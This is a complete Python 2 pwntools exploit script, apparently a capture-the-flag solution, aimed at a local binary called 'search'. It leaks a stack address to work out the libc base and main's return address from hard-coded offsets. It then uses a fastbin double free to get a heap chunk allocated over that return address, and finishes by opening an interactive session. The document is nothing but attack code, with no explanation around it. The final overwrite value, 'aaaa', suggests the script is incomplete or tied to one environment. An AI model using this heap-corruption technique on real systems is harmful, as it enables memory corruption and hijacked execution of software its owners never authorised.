from pwn import *

p = process("./search")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def alloc(size, content):
	p.recv()
	p.sendline("2")
        p.recv()
	p.sendline(str(size))
	print p.recv()
	p.sendline(content)

def free(size, content):
	p.recv()
        p.sendline("1")
        p.recv()
	p.sendline(str(size))
	p.recv()
	p.sendline(content)
	p.recv()
	p.sendline('y')

def free2(size, content):
        p.recv()
        p.sendline("1")
        p.recv()
        p.sendline(str(size))
        p.recv()
        p.sendline(content)
        p.recv()
        p.sendline('y')
        p.recv()
        p.sendline('y')
        p.recv()
        p.sendline('y')

p.recv()
p.sendline("a"*48)
p.recv()
p.sendline("a"*48)
p.recvuntil("a"*48)
leaked = u64(p.recvuntil(" ")[:-1]+"\x00\x00")
libcbase = leaked - (0x7fffffffe430 - 0x7ffff7a0d000)
mainRet = leaked - (0x7fffffffe430 - 0x7fffffffe4e8)
log.info("libc base : " + hex(libcbase))
log.info("main ret  : " + hex(mainRet))


alloc(1, "a")	# 1st chunk		addr : xxx10
alloc(1, "a")	# 2nd			addr : xxx60
alloc(1, "a")	# 3rd			addr : xxxb0
free2(1, "a")	# free order : 3-2-1

free(1, "\xb0")	# free 2nd chunk

alloc(1, "a")			# alloc on the chunk for search
alloc(8, p64(mainRet-0x10))	# address to overwrite
alloc(1, "a")
alloc(1, "a")

alloc(4, "aaaa")		# overwrite(not allocated by an error)
p.sendline("3")			# exploit

p.interactive()

